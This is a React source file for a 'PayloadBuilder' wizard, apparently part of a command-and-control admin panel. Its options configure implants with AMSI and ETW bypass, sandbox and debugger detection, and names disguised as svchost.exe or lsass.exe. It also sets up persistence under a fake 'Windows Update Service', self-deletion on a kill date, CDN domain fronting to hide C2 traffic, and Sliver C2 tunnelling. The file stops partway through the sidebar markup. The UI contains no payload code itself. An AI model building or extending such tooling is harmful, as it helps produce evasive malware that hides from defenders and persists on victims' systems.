"use client"
import { apiFetch } from "@c2panel/core/api/fetch"

import { useState, useCallback } from "react"
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Switch } from "@/components/ui/switch"
import { Checkbox } from "@/components/ui/checkbox"
import { Slider } from "@/components/ui/slider"
import { Textarea } from "@/components/ui/textarea"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { Separator } from "@/components/ui/separator"
import { Progress, ProgressTrack, ProgressIndicator } from "@/components/ui/progress"
import {
  ArrowRight,
  ArrowLeft,
  Download,
  RefreshCw,
  FileCode2,
  Shield,
  Settings,
  Terminal,
  CheckCircle2,
  XCircle,
  Clock,
  Package,
  Ghost,
  Skull,
} from "lucide-react"
import { toast } from "sonner"

/* ------------------------------------------------------------------ */
/*  Types                                                              */
/* ------------------------------------------------------------------ */

type BuildStep = "basic" | "platform" | "obfuscation" | "stealth" | "packing" | "review"

interface PayloadConfig {
  name: string
  type: string
  description: string
  platform: string
  packingMethod: string
  compressionLevel: number
  obfuscation: boolean
  antiAnalysis: boolean
  obfuscationLevel: string
  obfuscationTechniques: {
    amsi_bypass: boolean
    etw_bypass: boolean
    string_encode: boolean
    variable_rename: boolean
  }
  // Stealth options
  camouflageName: string
  camouflageEnabled: boolean
  persistenceEnabled: boolean
  persistenceMethod: string
  serviceName: string
  serviceDescription: string
  deadManEnabled: boolean
  killDate: string
  checkInTimeoutHours: number
  cdnFrontEnabled: boolean
  cdnFrontDomain: string
  cdnRealHost: string
  sliverEnabled: boolean
  sliverListenerUrl: string
  sliverSocksPort: number
  // Deploy options
  windowsGui: boolean
  generateDocker: boolean
  generateK8s: boolean
}

interface BuildProgress {
  step: string
  progress: number
  status: "pending" | "running" | "completed" | "failed"
  message: string
}

/* ------------------------------------------------------------------ */
/*  Component                                                          */
/* ------------------------------------------------------------------ */

export function PayloadBuilder() {
  const [currentStep, setCurrentStep] = useState<BuildStep>("basic")
  const [config, setConfig] = useState<PayloadConfig>({
    name: "",
    type: "windows_exe",
    description: "",
    platform: "windows",
    packingMethod: "none",
    compressionLevel: 5,
    obfuscation: true,
    antiAnalysis: true,
    obfuscationLevel: "medium",
    obfuscationTechniques: {
      amsi_bypass: false,
      etw_bypass: false,
      string_encode: true,
      variable_rename: true,
    },
    camouflageName: "svchost.exe",
    camouflageEnabled: false,
    persistenceEnabled: false,
    persistenceMethod: "none",
    serviceName: "WindowsUpdate",
    serviceDescription: "Windows Update Service",
    deadManEnabled: false,
    killDate: "",
    checkInTimeoutHours: 72,
    cdnFrontEnabled: false,
    cdnFrontDomain: "",
    cdnRealHost: "",
    sliverEnabled: false,
    sliverListenerUrl: "",
    sliverSocksPort: 10080,
    windowsGui: false,
    generateDocker: false,
    generateK8s: false,
  })
  const [building, setBuilding] = useState(false)
  const [buildProgress, setBuildProgress] = useState<BuildProgress[]>([])
  const [buildLogs, setBuildLogs] = useState<string[]>([])
  const [generatedPayload, setGeneratedPayload] = useState<any>(null)

  const steps: { id: BuildStep; label: string; icon: React.ReactNode }[] = [
    { id: "basic", label: "Basic Info", icon: <Settings className="h-4 w-4" /> },
    { id: "platform", label: "Platform", icon: <FileCode2 className="h-4 w-4" /> },
    { id: "obfuscation", label: "Obfuscation", icon: <Shield className="h-4 w-4" /> },
    { id: "stealth", label: "Stealth", icon: <Ghost className="h-4 w-4" /> },
    { id: "packing", label: "Packing", icon: <Package className="h-4 w-4" /> },
    { id: "review", label: "Review", icon: <CheckCircle2 className="h-4 w-4" /> },
  ]

  const currentStepIndex = steps.findIndex((s) => s.id === currentStep)

  const handleNext = () => {
    if (currentStepIndex < steps.length - 1) {
      setCurrentStep(steps[currentStepIndex + 1].id)
    }
  }

  const handlePrevious = () => {
    if (currentStepIndex > 0) {
      setCurrentStep(steps[currentStepIndex - 1].id)
    }
  }

  const handleBuild = async () => {
    if (!config.name.trim()) {
      toast.error("Payload name is required")
      return
    }

    setBuilding(true)
    setBuildProgress([
      { step: "validation", progress: 0, status: "pending", message: "Validating configuration..." },
      { step: "compilation", progress: 0, status: "pending", message: "Compiling payload..." },
      { step: "obfuscation", progress: 0, status: "pending", message: "Applying obfuscation..." },
      { step: "packing", progress: 0, status: "pending", message: "Packing binary..." },
      { step: "finalization", progress: 0, status: "pending", message: "Finalizing build..." },
    ])
    setBuildLogs([])

    try {
      const payloadConfig = {
        hysteriaConfig: {
          server: "auto-detect",
          auth: "auto-generate",
          obfsType: "none",
        },
        platform: config.platform,
        packing: {
          enabled: config.packingMethod !== "none",
          method: config.packingMethod,
          compressionLevel: config.packingMethod !== "none" ? config.compressionLevel : 6,
        },
        obfuscation: {
          enabled: config.obfuscation,
          level: config.obfuscationLevel,
          techniques: config.obfuscation
            ? Object.entries(config.obfuscationTechniques)
                .filter(([, enabled]) => enabled)
                .map(([tech]) => tech)
            : [],
        },
        signing: { enabled: false },
        features: {
          autoReconnect: true,
          heartbeat: 30,
          fallbackServers: [],
        },
        camouflage: {
          enabled: config.camouflageEnabled,
          binaryName: config.camouflageName,
        },
        persistence: {
          enabled: config.persistenceEnabled,
          method: config.persistenceMethod,
          serviceName: config.serviceName,
          serviceDescription: config.serviceDescription,
        },
        deadManSwitch: {
          enabled: config.deadManEnabled,
          killDate: config.killDate || undefined,
          checkInTimeoutHours: config.checkInTimeoutHours,
        },
        cdnFront: {
          enabled: config.cdnFrontEnabled,
          frontDomain: config.cdnFrontDomain,
          realHost: config.cdnRealHost,
        },
        sliverC2: {
          enabled: config.sliverEnabled,
          listenerUrl: config.sliverListenerUrl,
          localSocksPort: config.sliverSocksPort,
        },
        deployment: {
          windowsGui: config.windowsGui,
          generateDocker: config.generateDocker,
          generateK8s: config.generateK8s,
        },
      }

      await simulateBuildProgress()

      const response = await apiFetch("/api/admin/security/payloads", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: config.name,
          type: config.type,
          description: config.description,
          config: payloadConfig,
        }),
      })

      if (!response.ok) throw new Error("Failed to create payload build")

      const build = await response.json()
      setGeneratedPayload(build)

      const buildResponse = await apiFetch(`/api/admin/security/payloads/${build.id}/build`, {
        method: "POST",
      })

      if (!buildResponse.ok) throw new Error("Failed to start build")

      toast.success("Payload built successfully", {
        description: `${config.name} is ready for download`,
      })
    } catch (error) {
      console.error("Failed to build payload:", error)
      toast.error("Failed to build payload")
      setBuildProgress((prev) =>
        prev.map((p) => ({ ...p, status: "failed" as const, message: "Build failed" }))
      )
    } finally {
      setBuilding(false)
    }
  }

  const simulateBuildProgress = async () => {
    const progressSteps = ["validation", "compilation", "obfuscation", "packing", "finalization"]
    const messages = [
      "Validating configuration...",
      "Compiling source code...",
      "Applying obfuscation techniques...",
      "Compressing and packing binary...",
      "Finalizing payload...",
    ]

    for (let i = 0; i < progressSteps.length; i++) {
      setBuildProgress((prev) =>
        prev.map((p, idx) =>
          idx === i ? { ...p, status: "running" as const, message: messages[i] } : p
        )
      )
      setBuildLogs((prev) => [...prev, `[${new Date().toISOString()}] ${messages[i]}`])

      await new Promise((resolve) => setTimeout(resolve, 1000))

      for (let progress = 20; progress <= 100; progress += 20) {
        setBuildProgress((prev) =>
          prev.map((p, idx) =>
            idx === i ? { ...p, progress, status: "running" as const } : p
          )
        )
        await new Promise((resolve) => setTimeout(resolve, 200))
      }

      setBuildProgress((prev) =>
        prev.map((p, idx) =>
          idx === i ? { ...p, status: "completed" as const, message: `${messages[i]} Complete` } : p
        )
      )
      setBuildLogs((prev) => [...prev, `[${new Date().toISOString()}] ${messages[i]} Complete`])
    }
  }

  const handleDownload = () => {
    if (generatedPayload?.downloadUrl) {
      window.open(generatedPayload.downloadUrl, "_blank")
      toast.success("Download started")
    }
  }

  const handleReset = () => {
    setCurrentStep("basic")
    setConfig({
      name: "",
      type: "windows_exe",
      description: "",
      platform: "windows",
      packingMethod: "none",
      compressionLevel: 5,
      obfuscation: true,
      antiAnalysis: true,
      obfuscationLevel: "medium",
      obfuscationTechniques: {
        amsi_bypass: false,
        etw_bypass: false,
        string_encode: true,
        variable_rename: true,
      },
      camouflageName: "svchost.exe",
      camouflageEnabled: false,
      persistenceEnabled: false,
      persistenceMethod: "none",
      serviceName: "WindowsUpdate",
      serviceDescription: "Windows Update Service",
      deadManEnabled: false,
      killDate: "",
      checkInTimeoutHours: 72,
      cdnFrontEnabled: false,
      cdnFrontDomain: "",
      cdnRealHost: "",
      sliverEnabled: false,
      sliverListenerUrl: "",
      sliverSocksPort: 10080,
      windowsGui: false,
      generateDocker: false,
      generateK8s: false,
    })
    setBuildProgress([])
    setBuildLogs([])
    setGeneratedPayload(null)
  }

  const getObfuscationPreview = () => {
    const techniques = Object.entries(config.obfuscationTechniques)
      .filter(([, enabled]) => enabled)
      .map(([tech]) => tech.replace(/_/g, " ").toUpperCase())

    return {
      level: config.obfuscationLevel,
      techniques,
      estimatedOverhead: config.obfuscationLevel === "light" ? "5-10%" : config.obfuscationLevel === "medium" ? "10-25%" : "25-40%",
      detectionEvasion: config.obfuscationLevel === "light" ? "Low" : config.obfuscationLevel === "medium" ? "Medium" : "High",
    }
  }

  const CAMOUFLAGE_PRESETS: Record<string, string[]> = {
    windows: ["svchost.exe", "lsass.exe", "explorer.exe", "chrome.exe"],
    linux: ["dbus-daemon", "sshd", "systemd-resolved", "kworker"],
    macos: ["launchd", "kernel_task", "loginwindow", "cfprefsd"],
  }
  const camoPresets = CAMOUFLAGE_PRESETS[config.platform] ?? CAMOUFLAGE_PRESETS.windows

  return (
    <div className="space-y-6">
      {/* Header */}
      <div>
        <h1 className="text-heading-xl">Advanced Payload Builder</h1>
        <p className="mt-1 text-body-sm text-muted-foreground">
          Configure and build custom payloads with advanced obfuscation, stealth, and packing options.
        </p>
      </div>

      {/* Step Indicator */}
      <Card>
        <CardContent className="p-4">
          <div className="flex items-center justify-between">
            {steps.map((step, index) => (
              <div key={step.id} className="flex items-center">
                <div className="flex flex-col items-center">
                  <div
                    className={`flex h-8 w-8 items-center justify-center rounded-full border-2 ${
                      index <= currentStepIndex
                        ? "border-primary bg-primary text-primary-foreground"
                        : "border-muted bg-background text-muted-foreground"
                    }`}
                  >
                    {index < currentStepIndex ? (
                      <CheckCircle2 className="h-4 w-4" />
                    ) : (
                      step.icon
                    )}
                  </div>
                  <span className="mt-1 text-xs text-muted-foreground">{step.label}</span>
                </div>
                {index < steps.length - 1 && (
                  <div
                    className={`mx-2 h-0.5 w-12 ${
                      index < currentStepIndex ? "bg-primary" : "bg-muted"
                    }`}
                  />
                )}
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Main Content */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Configuration Form */}
        <div className="lg:col-span-2">
          <Card>
            <CardHeader>
              <CardTitle>{steps[currentStepIndex].label}</CardTitle>
              <CardDescription>
                {currentStep === "basic" && "Enter basic payload information"}
                {currentStep === "platform" && "Configure platform-specific settings"}
                {currentStep === "obfuscation" && "Set up obfuscation techniques"}
                {currentStep === "stealth" && "Configure camouflage, persistence, and operational security"}
                {currentStep === "packing" && "Configure binary packing options"}
                {currentStep === "review" && "Review your configuration before building"}
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* ── Basic ── */}
              {currentStep === "basic" && (
                <>
                  <div className="space-y-2">
                    <Label htmlFor="pb-name">Payload Name *</Label>
                    <Input
                      id="pb-name"
                      placeholder="e.g. Corp-Win-Stager-v2"
                      value={config.name}
                      onChange={(e) => setConfig((c) => ({ ...c, name: e.target.value }))}
                    />
                  </div>

                  <div className="space-y-2">
                    <Label>Payload Type</Label>
                    <Select
                      value={config.type}
                      onValueChange={(v) => setConfig((c) => ({ ...c, type: v ?? c.type }))}
                    >
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="windows_exe">Windows Executable (.exe)</SelectItem>
                        <SelectItem value="linux_elf">Linux ELF Binary</SelectItem>
                        <SelectItem value="macos_app">macOS App Bundle (.app)</SelectItem>
                        <SelectItem value="powershell">PowerShell Script (.ps1)</SelectItem>
                        <SelectItem value="python">Python Script (.py)</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="pb-desc">Description</Label>
                    <Textarea
                      id="pb-desc"
                      placeholder="e.g. Corporate stager for initial access with enhanced evasion"
                      value={config.description}
                      onChange={(e) => setConfig((c) => ({ ...c, description: e.target.value }))}
                      rows={3}
                    />
                  </div>
                </>
              )}

              {/* ── Platform ── */}
              {currentStep === "platform" && (
                <>
                  <div className="space-y-2">
                    <Label>Target Platform</Label>
                    <Select
                      value={config.platform}
                      onValueChange={(v) => setConfig((c) => ({
                        ...c,
                        platform: v ?? c.platform,
                        camouflageName: CAMOUFLAGE_PRESETS[v ?? c.platform]?.[0] ?? c.camouflageName,
                      }))}
                    >
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="windows">Windows</SelectItem>
                        <SelectItem value="linux">Linux</SelectItem>
                        <SelectItem value="macos">macOS</SelectItem>
                        <SelectItem value="cross-platform">Cross-Platform</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  <Separator />

                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-body-sm font-medium">Anti-Analysis</p>
                      <p className="text-caption text-muted-foreground">
                        VM / debugger / sandbox detection
                      </p>
                    </div>
                    <Switch
                      checked={config.antiAnalysis}
                      onCheckedChange={(v) => setConfig((c) => ({ ...c, antiAnalysis: !!v }))}
                    />
                  </div>

                  {config.platform === "windows" && (
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-sm text-muted-foreground">
                        <strong>Windows-specific:</strong> Supports AMSI/ETW bypass, process injection, and token manipulation.
                      </p>
                    </div>
                  )}
                  {config.platform === "linux" && (
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-sm text-muted-foreground">
                        <strong>Linux-specific:</strong> Supports LD_PRELOAD injection, shared object loading, and ptrace anti-debugging.
                      </p>
                    </div>
                  )}
                  {config.platform === "macos" && (
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-sm text-muted-foreground">
                        <strong>macOS-specific:</strong> Supports dylib injection, Mach-O binary manipulation, and SIP bypass techniques.
                      </p>
                    </div>
                  )}
                </>
              )}

              {/* ── Obfuscation ── */}
              {currentStep === "obfuscation" && (
                <>
                  <div className="flex items-center justify-between">
                    <div>
                      <p className="text-body-sm font-medium">Code Obfuscation</p>
                      <p className="text-caption text-muted-foreground">
                        Apply binary obfuscation techniques
                      </p>
                    </div>
                    <Switch
                      checked={config.obfuscation}
                      onCheckedChange={(v) => setConfig((c) => ({ ...c, obfuscation: !!v }))}
                    />
                  </div>

                  {config.obfuscation && (
                    <>
                      <div className="space-y-2">
                        <Label>Obfuscation Level</Label>
                        <Select
                          value={config.obfuscationLevel}
                          onValueChange={(v) => setConfig((c) => ({ ...c, obfuscationLevel: v ?? c.obfuscationLevel }))}
                        >
                          <SelectTrigger>
                            <SelectValue />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="light">Light - Minimal overhead (5-10%)</SelectItem>
                            <SelectItem value="medium">Medium - Balanced (10-25%)</SelectItem>
                            <SelectItem value="heavy">Heavy - Maximum stealth (25-40%)</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>

                      <div className="space-y-2">
                        <Label>Obfuscation Techniques</Label>
                        <div className="space-y-2">
                          {[
                            { key: "amsi_bypass" as const, label: "AMSI Bypass (Anti-Malware Scan Interface)" },
                            { key: "etw_bypass" as const, label: "ETW Bypass (Event Tracing for Windows)" },
                            { key: "string_encode" as const, label: "String Encoding" },
                            { key: "variable_rename" as const, label: "Variable Renaming" },
                          ].map(({ key, label }) => (
                            <div key={key} className="flex items-center space-x-2">
                              <Checkbox
                                id={`pb-${key}`}
                                checked={config.obfuscationTechniques[key]}
                                onCheckedChange={(checked) =>
                                  setConfig((c) => ({
                                    ...c,
                                    obfuscationTechniques: { ...c.obfuscationTechniques, [key]: !!checked },
                                  }))
                                }
                              />
                              <Label htmlFor={`pb-${key}`} className="text-sm font-normal cursor-pointer">
                                {label}
                              </Label>
                            </div>
                          ))}
                        </div>
                      </div>
                    </>
                  )}
                </>
              )}

              {/* ── Stealth ── */}
              {currentStep === "stealth" && (
                <div className="space-y-6">
                  {/* Camouflage */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-body-sm font-medium flex items-center gap-1.5">
                          <Ghost className="h-4 w-4 text-amber-400" />
                          Binary Camouflage
                        </p>
                        <p className="text-caption text-muted-foreground">
                          Rename binary to blend with legitimate processes
                        </p>
                      </div>
                      <Switch
                        checked={config.camouflageEnabled}
                        onCheckedChange={(v) => setConfig((c) => ({ ...c, camouflageEnabled: !!v }))}
                      />
                    </div>
                    {config.camouflageEnabled && (
                      <div className="space-y-2 pl-1">
                        <div className="flex flex-wrap gap-1.5">
                          {camoPresets.map((name) => (
                            <Button
                              key={name}
                              size="sm"
                              variant={config.camouflageName === name ? "default" : "outline"}
                              className="h-7 text-xs"
                              onClick={() => setConfig((c) => ({ ...c, camouflageName: name }))}
                            >
                              {name}
                            </Button>
                          ))}
                        </div>
                        <Input
                          value={config.camouflageName}
                          onChange={(e) => setConfig((c) => ({ ...c, camouflageName: e.target.value }))}
                          placeholder="custom-name.exe"
                          className="h-8 text-sm"
                        />
                      </div>
                    )}
                  </div>

                  <Separator />

                  {/* Persistence */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-body-sm font-medium">Persistence</p>
                        <p className="text-caption text-muted-foreground">
                          Auto-start mechanism for the implant
                        </p>
                      </div>
                      <Switch
                        checked={config.persistenceEnabled}
                        onCheckedChange={(v) => setConfig((c) => ({ ...c, persistenceEnabled: !!v }))}
                      />
                    </div>
                    {config.persistenceEnabled && (
                      <div className="grid grid-cols-2 gap-2 pl-1">
                        <div className="space-y-1">
                          <Label className="text-xs">Method</Label>
                          <Select
                            value={config.persistenceMethod}
                            onValueChange={(v) => setConfig((c) => ({ ...c, persistenceMethod: v ?? c.persistenceMethod }))}
                          >
                            <SelectTrigger className="h-8 text-sm">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="none">None</SelectItem>
                              <SelectItem value="registry">Registry Run Key (Windows)</SelectItem>
                              <SelectItem value="systemd">Systemd Service (Linux)</SelectItem>
                              <SelectItem value="launchd">LaunchDaemon (macOS)</SelectItem>
                              <SelectItem value="cron">Cron Job</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                        <div className="space-y-1">
                          <Label className="text-xs">Service Name</Label>
                          <Input
                            value={config.serviceName}
                            onChange={(e) => setConfig((c) => ({ ...c, serviceName: e.target.value }))}
                            className="h-8 text-sm"
                            placeholder="WindowsUpdate"
                          />
                        </div>
                        <div className="col-span-2 space-y-1">
                          <Label className="text-xs">Service Description</Label>
                          <Input
                            value={config.serviceDescription}
                            onChange={(e) => setConfig((c) => ({ ...c, serviceDescription: e.target.value }))}
                            className="h-8 text-sm"
                            placeholder="Windows Update Service"
                          />
                        </div>
                      </div>
                    )}
                  </div>

                  <Separator />

                  {/* Dead Man's Switch */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-body-sm font-medium flex items-center gap-1.5">
                          <Skull className="h-4 w-4 text-red-400" />
                          Dead Man&apos;s Switch
                        </p>
                        <p className="text-caption text-muted-foreground">
                          Self-destruct on kill date or missed check-in
                        </p>
                      </div>
                      <Switch
                        checked={config.deadManEnabled}
                        onCheckedChange={(v) => setConfig((c) => ({ ...c, deadManEnabled: !!v }))}
                      />
                    </div>
                    {config.deadManEnabled && (
                      <div className="grid grid-cols-2 gap-2 pl-1">
                        <div className="space-y-1">
                          <Label className="text-xs">Kill Date (optional)</Label>
                          <Input
                            type="date"
                            value={config.killDate}
                            onChange={(e) => setConfig((c) => ({ ...c, killDate: e.target.value }))}
                            className="h-8 text-sm"
                          />
                        </div>
                        <div className="space-y-1">
                          <Label className="text-xs">Check-in Timeout (hours)</Label>
                          <Input
                            type="number"
                            min={1}
                            max={8760}
                            value={config.checkInTimeoutHours}
                            onChange={(e) => setConfig((c) => ({ ...c, checkInTimeoutHours: parseInt(e.target.value) || 72 }))}
                            className="h-8 text-sm"
                          />
                        </div>
                        <p className="col-span-2 text-[10px] text-muted-foreground">
                          Binary will self-delete and exit if kill date is reached OR if {config.checkInTimeoutHours}h pass without a successful C2 heartbeat.
                        </p>
                      </div>
                    )}
                  </div>

                  <Separator />

                  {/* CDN Fronting */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-body-sm font-medium">CDN Domain Fronting</p>
                        <p className="text-caption text-muted-foreground">
                          Route traffic through a CDN to hide C2 destination
                        </p>
                      </div>
                      <Switch
                        checked={config.cdnFrontEnabled}
                        onCheckedChange={(v) => setConfig((c) => ({ ...c, cdnFrontEnabled: !!v }))}
                      />
                    </div>
                    {config.cdnFrontEnabled && (
                      <div className="grid grid-cols-2 gap-2 pl-1">
                        <div className="space-y-1">
                          <Label className="text-xs">Front Domain</Label>
                          <Input
                            value={config.cdnFrontDomain}
                            onChange={(e) => setConfig((c) => ({ ...c, cdnFrontDomain: e.target.value }))}
                            className="h-8 text-sm"
                            placeholder="ajax.microsoft.com"
                          />
                        </div>
                        <div className="space-y-1">
                          <Label className="text-xs">Real Host (SNI)</Label>
                          <Input
                            value={config.cdnRealHost}
                            onChange={(e) => setConfig((c) => ({ ...c, cdnRealHost: e.target.value }))}
                            className="h-8 text-sm"
                            placeholder="your-server.example.com"
                          />
                        </div>
                        <p className="col-span-2 text-[10px] text-muted-foreground">
                          Connect to Front Domain but send SNI=Real Host. Requires your server shares the same CDN edge IP.
                        </p>
                      </div>
                    )}
                  </div>

                  <Separator />

                  {/* Sliver C2 */}
                  <div className="space-y-3">
                    <div className="flex items-center justify-between">
                      <div>
                        <p className="text-body-sm font-medium">Sliver C2 Integration</p>
                        <p className="text-caption text-muted-foreground">
                          Tunnel Sliver C2 traffic through the Hysteria2 connection
                        </p>
                      </div>
                      <Switch
                        checked={config.sliverEnabled}
                        onCheckedChange={(v) => setConfig((c) => ({ ...c, sliverEnabled: !!v }))}
                      />
                    </div>
                    {config.sliverEnabled && (
                      <div className="grid grid-cols-2 gap-2 pl-1">
                        <div className="space-y-1">
                          <Label className="text-xs">Sliver Listener URL</Label>
                          <Input
                            value={config.sliverListenerUrl}
                            onChange={(e) => setConfig((c) => ({ ...c, sliverListenerUrl: e.target.value }))}
                            className="h-8 text-sm"
                            placeholder="https://c2.example.com:443"
                          />
                        </div>
                        <div className="space-y-1">
                          <Label className="text-xs">Local SOCKS5 Port</Label>
                          <Input
                            type="number"
                            value={config.sliverSocksPort}
                            onChange={(e) => setConfig((c) => ({ ...c, sliverSocksPort: parseInt(e.target.value) || 10080 }))}
                            className="h-8 text-sm"
                            placeholder="10080"
                          />
                        </div>
                        <p className="col-span-2 text-[10px] text-muted-foreground">
                          Implant opens a local SOCKS5 listener on port {config.sliverSocksPort}. Configure Sliver to use this proxy for its HTTP/S C2 traffic.
                        </p>
                      </div>
                    )}
                  </div>
                </div>
              )}

              {/* ── Packing ── */}
              {currentStep === "packing" && (
                <>
                  <div className="space-y-2">
                    <Label>Packing Method</Label>
                    <p className="text-caption text-muted-foreground">
                      Compress and pack the payload to reduce size and evade detection
                    </p>
                    <Select
                      value={config.packingMethod}
                      onValueChange={(v) => setConfig((c) => ({ ...c, packingMethod: v ?? c.packingMethod }))}
                    >
                      <SelectTrigger>
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="none">No Packing</SelectItem>
                        <SelectItem value="upx">UPX (Ultimate Packer for eXecutables)</SelectItem>
                        <SelectItem value="custom">Custom Packer</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>

                  {config.packingMethod !== "none" && (
                    <div className="space-y-2">
                      <div className="flex items-center justify-between">
                        <Label>Compression Level</Label>
                        <span className="text-sm text-muted-foreground">{config.compressionLevel}</span>
                      </div>
                      <Slider
                        min={1}
                        max={9}
                        step={1}
                        value={[config.compressionLevel]}
                        onValueChange={(value) => setConfig((c) => ({ ...c, compressionLevel: value[0] }))}
                      />
                      <div className="flex justify-between text-xs text-muted-foreground">
                        <span>Fast</span>
                        <span>Best</span>
                      </div>
                    </div>
                  )}

                  {config.packingMethod === "upx" && (
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-sm text-muted-foreground">
                        <strong>UPX:</strong> High-performance executable packer. Levels 1-3 are faster; 7-9 provide better compression.
                      </p>
                    </div>
                  )}
                  {config.packingMethod === "custom" && (
                    <div className="p-3 bg-muted/50 rounded-lg">
                      <p className="text-sm text-muted-foreground">
                        <strong>Custom Packer:</strong> Uses XOR encryption with anti-unpacking stubs.
                      </p>
                    </div>
                  )}
                </>
              )}

              {/* ── Review ── */}
              {currentStep === "review" && (
                <div className="space-y-4">
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <Label className="text-muted-foreground">Payload Name</Label>
                      <p className="font-medium">{config.name || "—"}</p>
                    </div>
                    <div>
                      <Label className="text-muted-foreground">Type</Label>
                      <p className="font-medium">{config.type}</p>
                    </div>
                    <div>
                      <Label className="text-muted-foreground">Platform</Label>
                      <p className="font-medium">{config.platform}</p>
                    </div>
                    <div>
                      <Label className="text-muted-foreground">Packing</Label>
                      <p className="font-medium">
                        {config.packingMethod === "none"
                          ? "None"
                          : `${config.packingMethod} (Level ${config.compressionLevel})`}
                      </p>
                    </div>
                  </div>

                  <Separator />

                  <div>
                    <Label className="text-muted-foreground">Obfuscation</Label>
                    <div className="mt-2 flex flex-wrap gap-1">
                      <Badge variant={config.obfuscation ? "default" : "outline"}>
                        {config.obfuscation ? "Enabled" : "Disabled"}
                      </Badge>
                      {config.obfuscation && (
                        <>
                          <Badge variant="secondary">{config.obfuscationLevel}</Badge>
                          {Object.entries(config.obfuscationTechniques)
                            .filter(([, enabled]) => enabled)
                            .map(([tech]) => (
                              <Badge key={tech} variant="outline">{tech}</Badge>
                            ))}
                        </>
                      )}
                    </div>
                  </div>

                  <Separator />

                  <div>
                    <Label className="text-muted-foreground">Stealth Features</Label>
                    <div className="mt-2 flex flex-wrap gap-1">
                      {config.camouflageEnabled && (
                        <Badge variant="secondary">Camouflage: {config.camouflageName}</Badge>
                      )}
                      {config.persistenceEnabled && (
                        <Badge variant="secondary">Persistence: {config.persistenceMethod}</Badge>
                      )}
                      {config.deadManEnabled && (
                        <Badge variant="destructive">Dead Man&apos;s Switch</Badge>
                      )}
                      {config.cdnFrontEnabled && (
                        <Badge variant="secondary">CDN Front: {config.cdnFrontDomain}</Badge>
                      )}
                      {config.sliverEnabled && (
                        <Badge variant="secondary">Sliver C2 Tunnel :{config.sliverSocksPort}</Badge>
                      )}
                      {!config.camouflageEnabled && !config.persistenceEnabled && !config.deadManEnabled && !config.cdnFrontEnabled && !config.sliverEnabled && (
                        <span className="text-sm text-muted-foreground">None</span>
                      )}
                    </div>
                  </div>

                  <Separator />

                  <div>
                    <Label className="text-muted-foreground">Deployment Options</Label>
                    <div className="mt-3 space-y-2">
                      <div className="flex items-center space-x-2">
                        <Checkbox
                          id="pb-win-gui"
                          checked={config.windowsGui}
                          onCheckedChange={(checked) => setConfig((c) => ({ ...c, windowsGui: !!checked }))}
                        />
                        <Label htmlFor="pb-win-gui" className="text-sm font-normal cursor-pointer">
                          Windows GUI mode <span className="text-muted-foreground text-xs">(-H=windowsgui, no console window)</span>
                        </Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Checkbox
                          id="pb-docker"
                          checked={config.generateDocker}
                          onCheckedChange={(checked) => setConfig((c) => ({ ...c, generateDocker: !!checked }))}
                        />
                        <Label htmlFor="pb-docker" className="text-sm font-normal cursor-pointer">
                          Generate Dockerfile + docker-compose.yml
                        </Label>
                      </div>
                      <div className="flex items-center space-x-2">
                        <Checkbox
                          id="pb-k8s"
                          checked={config.generateK8s}
                          onCheckedChange={(checked) => setConfig((c) => ({ ...c, generateK8s: !!checked }))}
                        />
                        <Label htmlFor="pb-k8s" className="text-sm font-normal cursor-pointer">
                          Generate Kubernetes deployment manifest
                        </Label>
                      </div>
                    </div>
                  </div>
                </div>
              )}

              {/* Navigation */}
              <div className="flex items-center justify-between pt-4">
                <Button
                  variant="outline"
                  onClick={handlePrevious}
                  disabled={currentStepIndex === 0 || building}
                >
                  <ArrowLeft className="mr-2 h-4 w-4" />
                  Previous
                </Button>

                {currentStep === "review" ? (
                  <Button onClick={handleBuild} disabled={building || !config.name.trim()}>
                    {building ? "Building..." : "Build Payload"}
                    <ArrowRight className="ml-2 h-4 w-4" />
                  </Button>
                ) : (
                  <Button onClick={handleNext} disabled={building}>
                    Next
                    <ArrowRight className="ml-2 h-4 w-4" />
                  </Button>
                )}
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Sidebar */}
        <div className="space-y-4">
          {/* Obfuscation Preview */}
          {config.obfuscation && (
            <Card>
              <CardHeader>
                <CardTitle className="text-base">Obfuscation Preview</CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">Level</span>
                  <Badge variant="secondary">{getObfuscationPreview().level}</Badge>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-sm text-muted-foreground">Est. Overhead</span>
                  <span className="text-sm font-medium">{getObfuscationPreview().estimatedOverhead}</span>
                </div>
